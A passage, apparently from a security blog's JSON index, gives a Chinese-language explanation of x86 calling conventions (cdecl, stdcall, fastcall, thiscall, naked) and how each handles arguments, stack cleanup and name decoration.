函数自身清理堆栈 函数名自动加前导的下划线，后面紧跟一个@符号，其后紧跟着参数的尺寸 cdecl是C和C++默认的调用约定 声明的语法： 12int function (int a ,int b); //不加修饰就是C调用约定 int __cdecl function(int a,int b);//明确指出C调用约定 cdecl调用约定意味着： 参数从右向左压入堆栈 调用者负责清理堆栈 C调用约定允许函数的参数的个数是不固定的，这也是C语言的一大特色。 仅在函数名前加上一个下划线前缀，格式为_functionname。 fastcall声明语法： 1int fastcall function(int a,int b); fastcall调用约定意味着： 函数的第一个和第二个DWORD参数（或者尺寸更小的）通过ecx和edx传递，其他参数通过从右向左的顺序压栈 函数自身清理堆栈 函数名修改规则同stdcall:函数名自动加前导的下划线，后面紧跟一个@符号，其后紧跟着参数的尺寸。 thiscallC++类成员函数缺省的调用约定 thiscall是唯一一个不能明确指明的函数修饰，因为thiscall不是关键字。由于成员函数调用还有一个this指针，因此必须特殊处理，thiscall意味着: 参数从右向左入栈 如果参数个数不确定，this指针在所有参数压栈后被压入堆栈。如果参数个数确定，this指针通过ecx传递给被调用者。 如果参数个数不确定，调用者清理堆栈，否则函数自己清理堆栈 对于参数个数固定情况下，类似于stdcall，不定时则类似cdecl naked call一个很少见的调用约定，一般用于实模式驱动程序设计","categories":[{"name":"二进制基础","slug":"二进制基础","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"}],"tags":[]}],"categories":[{"name":"Hook框架","slug":"Hook框架","permalink":"https://e1ectr0nlc.github.io/categories/Hook%E6%A1%86%E6%9E%B6/"},{"name":"bypass","slug":"bypass","permalink":"https://e1ectr0nlc.github.io/categories/bypass/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://e1ectr0nlc.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"name":"代码保护","slug":"代码保护","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"},{"name":"Dll注入","slug":"Dll注入","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"},{"name":"脚本工具","slug":"脚本工具","permalink":"https://e1ectr0nlc.github.io/categories/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/"},{"name":"二进制基础","slug":"二进制基础","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"}],"tags":[]}